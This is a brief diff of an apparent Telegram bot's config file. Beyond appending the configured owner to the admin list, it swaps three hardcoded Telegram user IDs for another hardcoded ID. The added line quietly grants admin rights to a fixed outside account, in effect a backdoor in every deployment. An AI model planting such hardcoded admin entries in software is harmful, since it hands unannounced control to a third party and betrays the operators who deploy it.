@@ -58,9 +58,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1938466384)
-ADMINS.append(1848248678)
-ADMINS.append(2083606760)
+ADMINS.append(1904365737)
 
 LOG_FILE_NAME = "okaerifile.txt"
 
